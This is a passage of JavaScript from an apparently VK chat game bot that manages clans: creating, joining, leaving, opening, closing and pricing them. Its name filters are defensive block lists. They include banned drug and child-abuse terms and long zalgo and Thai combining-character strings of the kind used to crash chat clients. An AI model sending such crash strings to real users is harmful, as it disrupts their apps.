спит|наркота|наркотики|кокс|амфетамин|кокаин|опиаты|6-мам|6-МАМ|морфин|кодеин|дигидрокодеин|6-mam|6-MAM|тебаин|буторфанол|наркотин|этилморфин|налорфин|пентазоцин|нальбуфин|бупренорфин|метамфетамин|эфедрин|псевдоэфедрин|хлорфентермин|амфепрамон|фенилэтиламин|фенилпропаноламин|сова никогда не спит|синий кит|синийкит|цп|cp|изнасилование|несовершеннолетние)/;
  var sss = zapret.test(zaprets1);
  let text = message.args[1].toLowerCase();
  var filter0 = /(http(s)?:\/\/.)?(www\.)?[-a-z0-9@:%._\+~#=]{1,256}\.[a-z]{2,6}/;
  var filter1 = /(?!http(s)?:\/\/)?(www\.)?[а-я0-9-_.]{1,256}\.(рф|срб|блог|бг|укр|рус|қаз|امارات.|مصر.|السعودية.)/;
  var lol = filter0.test(text);
  var lol1 = filter1.test(text);
  if (zapret.test(zaprets1) === true || message.args[1].toLowerCase() === "") {
    return bot(
      `вы используете запрещенные слова/символы/смайлики 🆘\n\n😉 Придумайте другое название клану.`
    );
  }
  if (message.args[1].length <= 2) {
    return bot(`вы указали слишком короткое название 🚫
❓Минимальная длина для названия клана 3 символов.`);
  }
  if (message.args[1].length >= 26) {
    return bot(`вы указали слишком длинное название 🚫
❓Максимальная длина для названия клана 25 символов.`);
  }
  if (filter0.test(text) == true || filter1.test(text) == true) {
    var check = true;
    return bot(`подозрительная ссылка.`);
  }

  let user = message.user;
  let name = message.args[1];
  let clanid = message.user.clanid;
  if (clans[clanid]) return bot(`вы уже состоите в другом клане ⚠`);
  if (message.user.balance < 1000000000000)
    return bot(`создание клана стоит 1.000.000.000.000$!
`);
  message.user.balance -= 1000000000000;
  Array.prototype.random = function() {
    return this[Math.floor(this.length * Math.random())];
  };
 if (!clans[clanid]) {
 	clans.number += 1;
    clans[clans.number] = {
      owner: message.user.id,
      users: {},
      zashita: 0,
      retin: 0,
      aue: 0,
      lox: 0,
      topsk: 0,
      pisko: 10,
      fuflo: 0,
      abramovich: 0,
      good: 0,
      pal: false,
      number: clans.number,
      name: name,
      regclanDate: `${data()}, ${time()}`,
      balance: 0,
      smile: `🤘`,
      open: true,
      price: 1000,
      exs: 0,
      people: 1
    };
    user.clanid = clans.number;
    clans[clans.number].users[message.user.uid] = {
      level: 3,
      names: message.user.tag,
      vlozhil: 0,
      don: 0,
      mts2: true,
      volos: false,
      idd: message.user.id,
      uidd: message.user.uid
    };

    return bot(
      `клан «${name}» успешно создан!

🆔 ID клана: ${clans.number}
🔥 Создатель клана: [id${message.user.id}|${message.user.tag}]
💸 Цена за вход: 1.000$

📚 Команды клана: кпомощь`,
      {
        attachment: ``,
        keyboard: JSON.stringify({
          inline: true,
          buttons: [
            [
              {
                action: {
                  type: "text",
                  payload: "{}",
                  label: "💡 Клан помощь"
                },
                color: "secondary"
              },
              {
                action: {
                  type: "text",
                  payload: "{}",
                  label: "⚔ Клан топ"
                },
                color: "positive"
              }
            ]
          ]
        })
      }
    );
    vk.api.messages.send({
		peer_id: message.peerId,
		sticker_id: 51594,
	});
  }
});

cmd.hear(
  /^(?:покинуть|❌ Покинуть|❌Покинуть|клан покинуть)$/i,
  async (message, bot) => {
    const idclan = message.user.clanid;

    if(!idclan){
      return message.send(
        `вы не состоите в каком-либо клане ${utils.pick([
          `??`,
          `😒`,
          `😟`,
          `🙄`,
          `🤔`
        ])}`
      );
    } 
    if(clans[idclan].users[message.user.uid].level === 3){
      return message.send(`создатель не может выйти из клана.`);
    }

    clans[idclan].people -= 1;
    message.user.clanid = false;
    delete clans[idclan].users[message.user.uid];
    return message.send(
      `вы добровольно покинули клан ${utils.pick([
        `🤤`,
        `☺`,
        `🙂`,
        `😁`,
        `😏`,
        `🤑`
      ])}`
    );
    let user = users.find(x => x.id === clans[idclan].owner);
    vk.api.messages.send({
        user_id: user.id,
        random_id: 0,
        message: `❌ Игрок [id${message.user.id}|${message.user.tag}] покинул клан «${clans[idclan].name}»

		▶ Введите «Оповещения выкл» для отключения всех клановых оповещений.`
      });
    
  }
);

cmd.hear(/^(?:коткрыть|клан открыть)/i, async (message, bot) => {
  let clanid = message.user.clanid;
  if (!clanid)
    return bot(
      `у вас нет клана, вступите или создайте клан ${utils.pick([
        `😳`,
        `😒`,
        `😟`,
        `🙄`,
        `🤔`
      ])}`
    );
  if (clans[clanid].users[message.user.uid].level < 2)
    return bot(
      `вы не создатель/администратор клана ${utils.pick([
        `😳`,
        `😒`,
        `😟`,
        `🙄`,
        `🤔`
      ])}`
    );
  if(clans[clanid].open == true)
    return bot(
      `ваш клан уже открыт, цена за вход: ${utils.sp(clans[clanid].price)}$ 🤑`
    );
  clans[clanid].open = true;
  return bot(
    `вы открыли клан, цена за вход: ${utils.sp(clans[clanid].price)}$ 🤑`
  );
});

cmd.hear(/^(?:кзакрыть|клан закрыть)/i, async (message, bot) => {
  let clanid = message.user.clanid;
  if (!clanid)
    return bot(
      `у вас нет клана, вступите или создайте клан ${utils.pick([
        `😳`,
        `😒`,
        `😟`,
        `🙄`,
        `🤔`
      ])}`
    );
  if (clans[clanid].users[message.user.uid].level < 2)
    return bot(
      `вы не создатель/администратор клана ${utils.pick([
        `😳`,
        `😒`,
        `😟`,
        `🙄`,
        `🤔`
      ])}`
    );
  if (clans[clanid].open == false)
    return bot(`ваш клан уже закрыт ${utils.pick([
      `😳`,
      `😒`,
      `😟`,
      `🙄`,
      `🤔`
    ])}

	🤑 Открыть: клан открыть`);
  clans[clanid].open = false;
  return bot(`вы закрыли клан, набор участников больше не производится ❌`);
});


cmd.hear(/^(?:кцена|клан цена)\s(.*)$/i, async (message, bot) => {
  let clanid = message.user.clanid;
  if (!clanid)
    return bot(
      `у вас нет клана, вступите или создайте клан ${utils.pick([
        `🤤`,
        `☺`,
        `🙂`,
        `😁`,
        `😏`,
        `🤑`
      ])}`
    );
  message.args[1] = message.args[1].replace(/(\.|\,)/gi, "");
  message.args[1] = message.args[1].replace(/(к|k)/gi, "000");
  message.args[1] = message.args[1].replace(/(м|m)/gi, "000000");
  message.args[1] = Math.floor(Number(message.args[1]));
  if (!Number(message.args[1]))
    return bot(`цена за вход: ${utils.sp(clans[clanid].price)}$ ${utils.pick([
      `🤤`,
      `☺`,
      `🙂`,
      `😁`,
      `😏`,
      `🤑`
    ])}

💸 Установить новую цену: клан цена [цена]`);
  if (message.args[1] <= 0)
    return bot(`цена за вход: ${utils.sp(clans[clanid].price)}$ ${utils.pick([
      `🤤`,
      `☺`,
      `🙂`,
      `😁`,
      `😏`,
      `🤑`
    ])}

💸 Установить новую цену: клан цена [цена]`);
  if (clans[clanid].users[message.user.uid].level < 2)
    return bot(`вы не создатель/администратор клана. ${errors}`);
  if (message.args[1] < 100)
    return bot(`цена для входа в клан не должна быть меньше 100$`);
  if (message.args[1] > 100000000000000)
    return bot(
      `цена для входа в клан не должна быть больше 100.000.000.000.000$`
    );
  clans[clanid].price = Number(message.args[1]);
  return bot(
    `вы установили новую цену за вход в клан: ${utils.sp(message.args[1])}$ 🤑`
  );
});

cmd.hear(/^(?:вступить|клан вступить|войти|клан войти|квступить)\s([0-9]+)$/i,
  async (message, bot) => {
    let idclan = message.args[1];
    let clanid = message.user.clanid;
    if (!clans[idclan])
      return bot(
        `такого клана не существует ${utils.pick([
          `😳`,
          `😒`,
          `😟`,
          `🙄`,
          `🤔`
        ])}`
      );
    if (clanid == idclan)
      return bot(
        `вы состоите в этом клане ${utils.pick([
          `🤤`,
          `☺`,
          `🙂`,
          `😁`,
          `😏`,
          `🤑`
        ])}`
      );
    if (clans[clanid])
      return bot(
        `вы состоите в другом клане ${utils.pick([
          `😳`,
          `😒`,
          `😟`,
          `🙄`,
          `🤔`
        ])}`
      );
    if (clans[idclan].people >= 50)
      return bot(
        `в данном клане максимальное количество участников ${utils.pick([
          `😳`,
          `😒`,
          `😟`,
          `🙄`,
          `🤔`
        ])}`
      );
    if (clans[idclan].open == false)
      return bot(
        `данный клан закрыт, в него нельзя войти ${utils.pick([
          `😳`,
          `😒`,
          `😟`,
          `🙄`,
          `🤔`
        ])}`
      );
    if (message.user.balance < clans[idclan].price)
      return message.send(
        `вход в данный клан стоит ${utils.sp(
          clans[idclan].price
        )}$ ${utils.pick([`😳`, `😒`, `😟`, `🙄`, `🤔`])}
	💰 Ваш баланс: ${utils.sp(message.user.balance)}$`);
    message.user.balance -= Number(clans[idclan].price);
    message.user.clanid = Number(message.args[1]);
    if (!clans[idclan].users[message.user.uid]) {
      clans[idclan].users[message.user.uid] = {
        level: 0,
        names: message.user.tag,
        vlozhil: 0,
        don: 0,
        volos: false,
        idd: message.user.id,
        uidd: message.user.uid
      };
      await message.send(
      `вы вошли в клан «${clans[idclan].name}» за ${utils.sp(
        clans[idclan].price
      )}$ ${utils.pick([
        `🤤`,
        `☺`,
        `🙂`,
        `😁`,
        `😏`,
        `🤑`
      ])}\n\n📚 Команды клана: кпомощь`);
    }
    clans[idclan].people += 1;
    clans[idclan].balance += clans[idclan].price;
    let user = users.find(x => x.id === clans[idclan].owner);

      vk.api.messages.send({
        user_id: user.id,
        random_id: 0,
        message: `🗣 Игрок [id${message.user.id}|${message.user.tag}] вступил в клан «${clans[idclan].name}»

	▶ Введите «Оповещения выкл» для отключения всех клановых оповещений.`
      });
  }
);

cmd.hear(/^(?:кназвание|клан название)\s([^]+)$/i, async (message, bot) => {
  if (message.user.clanid == false)
    return bot(
      `у вас нет клана, вступите или создайте клан ${utils.pick([
        `??`,
        `☺`,
        `🙂`,
        `😁`,
        `😏`,
        `🤑`
      ])}`
    );
  let zaprets1 = message.args[1].toLowerCase();
  var zapret = /(&#4448;|ᅠ|أعلى|أحبك|&#1;||марихуана| | || |™| |&#0000;|| |™.|youtu.be|˙̢̢̡̢̧̡̢̛̛̛̣̭̺̪̣̤̟̭͕̭̭̙͍͉͙̖͖̱̩̤̘̝̲͍͚͇̫̟͈͚̘̰̫̰̼̟̦͚̜̫͎̘̯̭̙̼̼̰̱̟̗͎̜͖͕̪͔̭̭̺̙͍̞̰̭̎͆̆̊̓͊̌̍͑̈́̊̓̌̀́͐̊̐̀͆̐̿̾́̇͌̅̐̐̎̊̽̅̏̿̋̍͑̔͒̽̋̏̋̋̋̇́̐̈͗̆̈́̌͗͐̽̈́̾̏̊͛͌͒͋̊̽̐̒͋͑͊͊̊̾̂̏̏̓̄̈͐͐̋̇͌̇̽̓͌̾͑̍̓́̈́̀̂̑̑̍̐̒̍͑̿̍͊͆͋̋̔̍̈̈̂̊̐̏͂̇̈̾̂͑̽̓̋͊̔̂̀̀͑̌͛͂̿̍̌̅̔̈́̓̓͗͛͑̏̇̐̍̌̈́̏̍̈̃̓̓̍̿̎́͌̍̈́̾̔̉́͐̓̕͘̕͘͘͜͜͠͝͝͝͠͠͝͠͝͝͠͝͝͝͝͝͝ͅ˙̵̧̡̢̨̧̧̢̨̢̨̡̡̢̧̢̧̨̨̧̢̡̡̨̡̧̡̡̨̛̛̛̛̛̛̛̪͇̥̝̼̻̗͓̤̱͖̙̭̯͙̦̭̗͚͉̜̳͎͎͇̪̭̠̖̱̣̠̟͉̯̣̮͚̙̹̠̤̞͔̩̼̻̟̻͔̹̠͚͍͕̣̹̞̲͙̠̳̟͕̣͇̭̹̮͕̯̫͚͕͕̯͔̟̺̞̟͉̥̞̗̼̭͉̩̣͖̘̣͓̣͎̖̖̥̖̳̮̦̥̹̙̲̘̰̘͈̮̞͙̘̟̯͚̲̜̰̦̯͇̥̯̭̼̥̼̯̖͈̥͎̳̯̻̦̗̖̘͍̬͍̻̠̝̭̜͇̯͔̹͉͖͕̜̳̹̹̜̹̗̺͈̻̹̲̪͚̯̙̤̤̰̞͖̳̜̫͚̖̰̺͕̮̠͇͎͕̘͉͉̟̥̩͙̖͔̟̮͓̪̯̣̼̂̿̿͆̽̾̆̋̓̂̆̀̋̓̋͐̓͌̓̏̈̔̉̀̀̈̈̾̎̓̀͋̀̈́͂̀̓͑̂̍̄̂́̈́̔͋̽́̏̀̂́̿͒͊͌̈́̓́͗͌̀̈́͗͛͌̉̏͛͋̎̂̅̇̒͋́̆̐̓̌́͑̌͗͋͐͒̾́̂̀̀̃͋͆̐̈̉̓͊̽̌͑̽̅͊͛̍̅̃̒̀͐̽͒̓͊̅̈͐̈́͆͊͒̆̋̃̂͗̓͆̾̆͂̓̿̐̄̀̀͂̉̋̚͘̚͘̚̕̕̚̕̚̚̕̚̚̚̚̕̕͜͜͜͜͜͜͜͜͜͠͝͠͝͠͠͠͝͠͝͝ͅͅͅ˙̧̡͕̰͖̰̬̩̞͔̩̞͖̤̞͍̙̥̭͎̻̭͖̳͈̦̹̣̖̞̘͕̗̖̱͍̗̩̩̳̹̹͚͙̗͙̲̪̝̫̰͇͎̤̬̼͉̤̹͓̭͈͛̈̑̌̏͒̽͐̃̅͂̓̐̌̈́̽̽̈́͗̏̅͆͂͛̍̾͑͑̌̊̄͑̎̑̈́͆̍̈͛̑̈́̀̆̄̇͋̏̏̀́̀͋̎̉̚̚͜͜͜͜͜͝͝͠˙̴̡̢̧̧̧̧̡̧̧̡̨̢̢̨̡̛̛̳̦̪̹̠̱̩̘̝̤͇̟̟̜̬̯͍͚͎͔̣͎̗̯͈̲̞͙̟̞̖͍̜̖͕͓̝̠̣͉̹̲̱̭͔̬̞̼̬̱͚̫̣͍̩̯̜͍͕͚̪̹̯͙̫̝̖͓͖̹̜̙̞̻͖̤͚̤̹̞̪͉͖͇̤̱̺̗̖̪̘̰̯̼͔̬̠̖͍̖͍̭͖̣̮̫͙̯̪̥͕̼͕͖̗̺̜̩̙̱̱͍͎̩̖͈̤̣̹̹̘̭͕̮͍̠̫̥̝̟̗̗͍̺͚̺̗͕͎͈̹̗̠̬̞̠̘̗̲͙̗͎̦̖̜̤̼̠̰͙̙̳̞̜͉͔͙̭̮̃̊̎͒̈̽̓̌͛̒͂̓͑̐̋͒͂̊͗͐̓̆͒̀̇͛́̉̌́̌̍̈́͌͌̽̉̉͒͊̀̂́̑̉̿͆̉̀̌͛̆̔͊̄̄̑̈́͗̒̀́̐̈́͑́̽͑͋̾̎̐͗̈̒̀̀̀̌̆̉̾̍̏̓̃̊̅͌̅̏̀̅͋̀̍͒̄̈́̀̎̅̊̔̆̓̋̄̽̍̀̋̈́̄̇̽͂̍̃̍͐̓̅̌̈́͂̓̈́͗̊͛̈́͊̀̾̊̿͊̑̑̑͑̽̈̿̋̏̂͒͗̆̽́͋̓͒̒̿̒͑͐̿̈́̓̉̇̚͘̕͘͘͘̚͘͜͜͜͜͝͝͝͠͝͠͝͝͠͠͝͝͝͝͠͝ͅͅͅͅͅͅ˙̢̧̢̡̧̧̧̧̢̡̡̨̛̛̛̛̛̛̞̺̺͚̻̜̗͇͇̥̞̭̯͓͍̗̝̫̥͎̭̙͔̫̜̝̱͎̦͉͚̪̘̥̖̥̙̰͙͕͚͓̹͈̤̗͈͈̪͓̙̪̗̤̱̫̯̩̹̪͙͖̱̦̞͎̺̫̣̥͇̥͖̩̰̜̞͉̞͓̥̤͕͙̥̥̳̤̞͔̟̟̯̲͉͉͍̜̗͎̦̱̯̺̤̟̱̹̫̖̹̜̠̳̦̹̺̜̥̬̹̭̯̬͍̥͙̠̙̥̭͔̻̩̫̹̦͍̺̫̤̪̜̙̠̞͇̖̣̼͙̳̫̮͈͈̦͈̭̱̺̺͚̰̻̤̭͈̯̮̙̦̖̠̜͇̪̙̭͉̝̹̲͍̟̫͖̰̻͕͙͓̲̾̑́̍̓̃̅̇͛̂̌̀̀̂͗̊͋͗̾̿̅͗̅̒́̓̾͆̍̽͐̾̉͊̋͗̽̒̐͗̀̾͑́̃̓̀́̊̄̿̓͐̅̇̐͒́̋̈́̀̄͌̐̋̃͋̐͌̒̓͗͛̏̓͐̒͌̓̓̊̈́̈̅̈́͗͒̊̇̀͂̅̿̄̍̾̆̄̇̇̋̾̾̂̅̉̎̈́̇́̍̅͑͌̃̀̈̈́̿͗̏̈́̃̌̄̈́̈́͐͊͌́̑̊̀͆̅͂͊͆͌̎͋͑́̌́̏̿̽̈̈́͆͑̋̈́̂̂̏̿̀̇͗́́̿̂̅͛͗͋͐͑͗͌͐̏̐̓̆̽͑̆̿̉͑͆̒͘̚͘͘̚̕̕̚͘͜͜͜͜͜͝͝͝͠͝͝͝͝͠͝͠͝ͅͅͅͅͅͅͅͅ˙̢̡̨̨̨̧̡̢̡̡̧̧̡̡̢̛̛̛̛̛͚̙̭͇͍̫̪̬͚͚͖͔͇͕̼̩͍̦̫͚̭̞̦̮̮̥͙̱̥͉̗̬͕̜̟̭̜̳̞̙̻͕̪̥͓̗̟̳̲̠͇̱̫͉͚̮̺̝͓̝͓͕̼͖̻̲̹̠̼̤̹̺͍̭̯̼̝̖̩͕̜̼̬̠̭͓̙̼̙͓̼̘̠̖̝̦͙̝͓̣̥͍̗̻͍̦̪͍̘͉̤͚̮͚̺̗̖̘̻̬̭̟̫̹̞͍͚̦̝̠͖̦̹̲͔͉͓͙̺͇̮͖̝̤̮̭͖͚͎̖̫̫̦̙̺͖̩͖̦͉̭̤̪̦͍̭̥͔̮͙̝̥̬̠̣̺̖̰͈̻̹͚͙̠̗̙͙͉͔͉̖̝̠̣͚͈̱̭̖̮͉͇͙̹̝̫̝̱̦̼̤͍̣̺̮̜̦̯̅̈́͂͒̈́̌̋̇̇̅́͒̒͊̏̈́̏̋͛̓̀͒͋̈́̀̒̊͌͆̿̂͌̔̊̏̊͗͒͊̿̽̀̌̉̍̋̔̉͑͐͆̏͑̌̈́͛͗̐͒̄̍̾̒̅͌̀̏̏̃͂̎͑͑̅̑̏̓̎̋͊͋̆̿̓͘̚̚͘͘̚͜͜͜͝͠͝͠ͅͅͅͅͅͅͅ˙̵̡̢̨̡̧̧̡̢̛̱̲̰̞̞̝͎͔̳̹̣͉̠̟̰̪͍̘̜͇̲̥̖͕̹͔͍͓̯͕͔͚̳͉͙̘̺̥̦̯̞̣͚̜̘̫͚̩̪͈̻̣̗̫̳̙̠̖̠̝̫̞͔̹̫̝̰͙͕͖͓̩̤̲̟̹̥͋́́̋͊̌̎̄̓͆͗̓͛͑́̉̂̽̌͋̿͌̃̌́̄͆̉̽̀͊͛̅́̀͋̔̎͊̓̇̀͘̚͘͘̕͜͝͝ͅ°̡̛̛̛̛̥̗̹̬̠̙̗̞̲̺̦̬̠͚̺͖̗̰̝͛̈́̑͆̌̉̂̈̀̏̏̅͌͆͆͌̀͑̂̂͑̍͊͒̇̏͐̈́̇͌͂̑̌̊̅̒̌̈́͑̿̾͐̐̽̏́̈̔͗͆̀̋̏̐͋̃͒̊͊̾̋̽̉́̋̅͆̄̾̆̃͑̄́̆̇̐̃́̈́́̒͗̄̽̄̈́̇̎̊̒͗̾͐̍͂̐͋̀̊͐̇͑̽̑̀̀͆̓̍̈́̇̑̓̎͐͋̄͌̌͗̔̄̑̐̀̒̈́͆̊͆͌̓̓͛͑͒̾͆̿͂́̆̏͂̊̄̓̌̽̾̈́̓̽̋̇̌́̃̈́̍̌̋̽̓́̔̏͂̎̿̌̐̎̂̏̋̇̉̈́̕͘͘͘̚̚͘̚̕͘̚̕͘͘͘͘͘̚͝͝͝͝͝͝͝͝ͅ|˙̢̢̡̢̧̡̢̛̛̛̣̭̺̪̣̤̟̭͕̭̭̙͍͉͙̖͖̱̩̤̘̝̲͍͚͇̫̟͈͚̘̰̫̰̼̟̦͚̜̫͎̘̯̭̙̼̼̰̱̟̗͎̜͖͕̪͔̭̭̺̙͍̞̰̭̎͆̆̊̓͊̌̍͑̈́̊̓̌̀́͐̊̐̀͆̐̿̾́̇͌̅̐̐̎̊̽̅̏̿̋̍͑̔͒̽̋̏̋̋̋̇́̐̈͗̆̈́̌͗͐̽̈́̾̏̊͛͌͒͋̊̽̐̒͋͑͊͊̊̾̂̏̏̓̄̈͐͐̋̇͌̇̽̓͌̾͑̍̓́̈́̀̂̑̑̍̐̒̍͑̿̍͊͆͋̋̔̍̈̈̂̊̐̏͂̇̈̾̂͑̽̓̋͊̔̂̀̀͑̌͛͂̿̍̌̅̔̈́̓̓͗͛͑̏̇̐̍̌̈́̏̍̈̃̓̓̍̿̎́͌̍̈́̾̔̉́͐̓̕͘̕͘͘͜͜͠͝͝͝͠͠͝͠͝͝͠͝͝͝͝͝͝ͅ˙̵̧̡̢̨̧̧̢̨̢̨̡̡̢̧̢̧̨̨̧̢̡̡̨̡̧̡̡̨̛̛̛̛̛̛̛̪͇̥̝̼̻̗͓̤̱͖̙̭̯͙̦̭̗͚͉̜̳͎͎͇̪̭̠̖̱̣̠̟͉̯̣̮͚̙̹̠̤̞͔̩̼̻̟̻͔̹̠͚͍͕̣̹̞̲͙̠̳̟͕̣͇̭̹̮͕̯̫͚͕͕̯͔̟̺̞̟͉̥̞̗̼̭͉̩̣͖̘̣͓̣͎̖̖̥̖̳̮̦̥̹̙̲̘̰̘͈̮̞͙̘̟̯͚̲̜̰̦̯͇̥̯̭̼̥̼̯̖͈̥͎̳̯̻̦̗̖̘͍̬͍̻̠̝̭̜͇̯͔̹͉͖͕̜̳̹̹̜̹̗̺͈̻̹̲̪͚̯̙̤̤̰̞͖̳̜̫͚̖̰̺͕̮̠͇͎͕̘͉͉̟̥̩͙̖͔̟̮͓̪̯̣̼̂̿̿͆̽̾̆̋̓̂̆̀̋̓̋͐̓͌̓̏̈̔̉̀̀̈̈̾̎̓̀͋̀̈́͂̀̓͑̂̍̄̂́̈́̔͋̽́̏̀̂́̿͒͊͌̈́̓́͗͌̀̈́͗͛͌̉̏͛͋̎̂̅̇̒͋́̆̐̓̌́͑̌͗͋͐͒̾́̂̀̀̃͋͆̐̈̉̓͊̽̌͑̽̅͊͛̍̅̃̒̀͐̽͒̓͊̅̈͐̈́͆͊͒̆̋̃̂͗̓͆̾̆͂̓̿̐̄̀̀͂̉̋̚͘̚͘̚̕̕̚̕̚̚̕̚̚̚̚̕̕͜͜͜͜͜͜͜͜͜͠͝͠͝͠͠͠͝͠͝͝ͅͅͅ˙̧̡͕̰͖̰̬̩̞͔̩̞͖̤̞͍̙̥̭͎̻̭͖̳͈̦̹̣̖̞̘͕̗̖̱͍̗̩̩̳̹̹͚͙̗͙̲̪̝̫̰͇͎̤̬̼͉̤̹͓̭͈͛̈̑̌̏͒̽͐̃̅͂̓̐̌̈́̽̽̈́͗̏̅͆͂͛̍̾͑͑̌̊̄͑̎̑̈́͆̍̈͛̑̈́̀̆̄̇͋̏̏̀́̀͋̎̉̚̚͜͜͜͜͜͝͝͠˙̴̡̢̧̧̧̧̡̧̧̡̨̢̢̨̡̛̛̳̦̪̹̠̱̩̘̝̤͇̟̟̜̬̯͍͚͎͔̣͎̗̯͈̲̞͙̟̞̖͍̜̖͕͓̝̠̣͉̹̲̱̭͔̬̞̼̬̱͚̫̣͍̩̯̜͍͕͚̪̹̯͙̫̝̖͓͖̹̜̙̞̻͖̤͚̤̹̞̪͉͖͇̤̱̺̗̖̪̘̰̯̼͔̬̠̖͍̖͍̭͖̣̮̫͙̯̪̥͕̼͕͖̗̺̜̩̙̱̱͍͎̩̖͈̤̣̹̹̘̭͕̮͍̠̫̥̝̟̗̗͍̺͚̺̗͕͎͈̹̗̠̬̞̠̘̗̲͙̗͎̦̖̜̤̼̠̰͙̙̳̞̜͉͔͙̭̮̃̊̎͒̈̽̓̌͛̒͂̓͑̐̋͒͂̊͗͐̓̆͒̀̇͛́̉̌́̌̍̈́͌͌̽̉̉͒͊̀̂́̑̉̿͆̉̀̌͛̆̔͊̄̄̑̈́͗̒̀́̐̈́͑́̽͑͋̾̎̐͗̈̒̀̀̀̌̆̉̾̍̏̓̃̊̅͌̅̏̀̅͋̀̍͒̄̈́̀̎̅̊̔̆̓̋̄̽̍̀̋̈́̄̇̽͂̍̃̍͐̓̅̌̈́͂̓̈́͗̊͛̈́͊̀̾̊̿͊̑̑̑͑̽̈̿̋̏̂͒͗̆̽́͋̓͒̒̿̒͑͐̿̈́̓̉̇̚͘̕͘͘͘̚͘͜͜͜͜͝͝͝͠͝͠͝͝͠͠͝͝͝͝͠͝ͅͅͅͅͅͅ˙̢̧̢̡̧̧̧̧̢̡̡̨̛̛̛̛̛̛̞̺̺͚̻̜̗͇͇̥̞̭̯͓͍̗̝̫̥͎̭̙͔̫̜̝̱͎̦͉͚̪̘̥̖̥̙̰͙͕͚͓̹͈̤̗͈͈̪͓̙̪̗̤̱̫̯̩̹̪͙͖̱̦̞͎̺̫̣̥͇̥͖̩̰̜̞͉̞͓̥̤͕͙̥̥̳̤̞͔̟̟̯̲͉͉͍̜̗͎̦̱̯̺̤̟̱̹̫̖̹̜̠̳̦̹̺̜̥̬̹̭̯̬͍̥͙̠̙̥̭͔̻̩̫̹̦͍̺̫̤̪̜̙̠̞͇̖̣̼͙̳̫̮͈͈̦͈̭̱̺̺͚̰̻̤̭͈̯̮̙̦̖̠̜͇̪̙̭͉̝̹̲͍̟̫͖̰̻͕͙͓̲̾̑́̍̓̃̅̇͛̂̌̀̀̂͗̊͋͗̾̿̅͗̅̒́̓̾͆̍̽͐̾̉͊̋͗̽̒̐͗̀̾͑́̃̓̀́̊̄̿̓͐̅̇̐͒́̋̈́̀̄͌̐̋̃͋̐͌̒̓͗͛̏̓͐̒͌̓̓̊̈́̈̅̈́͗͒̊̇̀͂̅̿̄̍̾̆̄̇̇̋̾̾̂̅̉̎̈́̇́̍̅͑͌̃̀̈̈́̿͗̏̈́̃̌̄̈́̈́͐͊͌́̑̊̀͆̅͂͊͆͌̎͋͑́̌́̏̿̽̈̈́͆͑̋̈́̂̂̏̿̀̇͗́́̿̂̅͛͗͋͐͑͗͌͐̏̐̓̆̽͑̆̿̉͑͆̒͘̚͘͘̚̕̕̚͘͜͜͜͜͜͝͝͝͠͝͝͝͝͠͝͠͝ͅͅͅͅͅͅͅͅ˙̢̡̨̨̨̧̡̢̡̡̧̧̡̡̢̛̛̛̛̛͚̙̭͇͍̫̪̬͚͚͖͔͇͕̼̩͍̦̫͚̭̞̦̮̮̥͙̱̥͉̗̬͕̜̟̭̜̳̞̙̻͕̪̥͓̗̟̳̲̠͇̱̫͉͚̮̺̝͓̝͓͕̼͖̻̲̹̠̼̤̹̺͍̭̯̼̝̖̩͕̜̼̬̠̭͓̙̼̙͓̼̘̠̖̝̦͙̝͓̣̥͍̗̻͍̦̪͍̘͉̤͚̮͚̺̗̖̘̻̬̭̟̫̹̞͍͚̦̝̠͖̦̹̲͔͉͓͙̺͇̮͖̝̤̮̭͖͚͎̖̫̫̦̙̺͖̩͖̦͉̭̤̪̦͍̭̥͔̮͙̝̥̬̠̣̺̖̰͈̻̹͚͙̠̗̙͙͉͔͉̖̝̠̣͚͈̱̭̖̮͉͇͙̹̝̫̝̱̦̼̤͍̣̺̮̜̦̯̅̈́͂͒̈́̌̋̇̇̅́͒̒͊̏̈́̏̋͛̓̀͒͋̈́̀̒̊͌͆̿̂͌̔̊̏̊͗͒͊̿̽̀̌̉̍̋̔̉͑͐͆̏͑̌̈́͛͗̐͒̄̍̾̒̅͌̀̏̏̃͂̎͑͑̅̑̏̓̎̋͊͋̆̿̓͘̚̚͘͘̚͜͜͜͝͠͝͠ͅͅͅͅͅͅͅ˙̵̡̢̨̡̧̧̡̢̛̱̲̰̞̞̝͎͔̳̹̣͉̠̟̰̪͍̘̜͇̲̥̖͕̹͔͍͓̯͕͔͚̳͉͙̘̺̥̦̯̞̣͚̜̘̫͚̩̪͈̻̣̗̫̳̙̠̖̠̝̫̞͔̹̫̝̰͙͕͖͓̩̤̲̟̹̥͋́́̋͊̌̎̄̓͆͗̓͛͑́̉̂̽̌͋̿͌̃̌́̄͆̉̽̀͊͛̅́̀͋̔̎͊̓̇̀͘̚͘͘̕͜͝͝ͅ°̛͛̈́̑͆̌̉̂̈̀̏̏̅͌͆͆͌̀͑̂̂͑̍͊͒̇̏͐̈́̇͌͂̑̌̊̅̒̌̈́͑̿̾͐̐̽̏́̕͘͘͘̚̚͘͝|ส็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็็|ส|™|56#͓͓͓͓̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏#͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏|разбуди в 